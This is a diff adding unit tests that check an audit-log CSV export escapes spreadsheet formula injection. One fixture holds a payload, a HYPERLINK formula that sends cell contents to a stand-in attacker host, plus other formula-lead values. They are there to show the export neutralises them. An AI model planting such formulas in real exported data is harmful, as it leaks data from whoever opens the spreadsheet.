@@ -5,6 +5,7 @@ import { mount, click, flushUntil, buttonNamed, buttons } from '../../test/mount
 import {
   AuditExportPanel, AUDIT_EXPORT_DEFAULT_DAYS, manifestLines, toCsv,
 } from './AuditExportPanel';
+import { escapeCsvField } from '../tabular/csv';
 
 const TAKEN_AT = Date.UTC(2026, 7, 31, 12, 0);
 const FROM = Date.UTC(2026, 7, 1);
@@ -130,6 +131,47 @@ describe('AuditExportPanel', () => {
       }],
     }));
     expect(csv).toContain('"The ""Ashcroft"" matter"');
+  });
+
+  it('neutralises a formula in a matter name, so an admin opening the extract does not run it', () => {
+    /*
+     * C2. `toCsv` re-implemented half of `escapeCsvField` — the quote
+     * doubling kept, the formula-lead guard dropped — and this is the file
+     * that guard exists for. Matter names are free text through
+     * `PUT /v1/matters/:id`, a `reviewer` route; the audit extract is the
+     * widest read in the application and the artefact most likely to be
+     * opened in a spreadsheet BY AN ADMINISTRATOR. Quoting protects column
+     * alignment, not formula evaluation.
+     */
+    const csv = toCsv(result({
+      rows: [{
+        at: FROM, source: 'audit_event', kind: 'matter.created', byUserId: 'u',
+        matterName: '=HYPERLINK("https://attacker.example/"&A1,"Open extract")',
+        reviewName: '+1 555 0100', clauseId: '-1,000', subjectType: '@landlord',
+      }],
+    }));
+    expect(csv).toContain('"\'=HYPERLINK(');
+    expect(csv).toContain('"\'+1 555 0100"');
+    expect(csv).toContain('"\'-1,000"');
+    expect(csv).toContain('"\'@landlord"');
+    // No cell anywhere in the file opens on a formula lead character.
+    for (const cell of csv.split('\n').flatMap(l => l.split('","'))) {
+      expect(cell.replace(/^"/, ''), cell).not.toMatch(/^[=+\-@]/);
+    }
+  });
+
+  it('uses escapeCsvField itself rather than a second escape that agrees today', () => {
+    // One implementation, reused — not two that happen to match. The repo-wide
+    // half of this claim is `src/test/csvSafety.test.ts`; this half is that
+    // the output is byte-identical to the shared function's for the cases the
+    // shared function was written for.
+    for (const value of ['=SUM(A1:A9)', 'she said "hi"', 'rent, due monthly', '']) {
+      const csv = toCsv(result({
+        rows: [{ at: FROM, source: 'audit_event', kind: 'matter.created', byUserId: 'u',
+          matterName: value || undefined, matterId: value }],
+      }));
+      expect(csv).toContain(escapeCsvField(value));
+    }
   });
 
   it('renders the refusal as a refusal, naming the source and offering a narrower range', async () => {
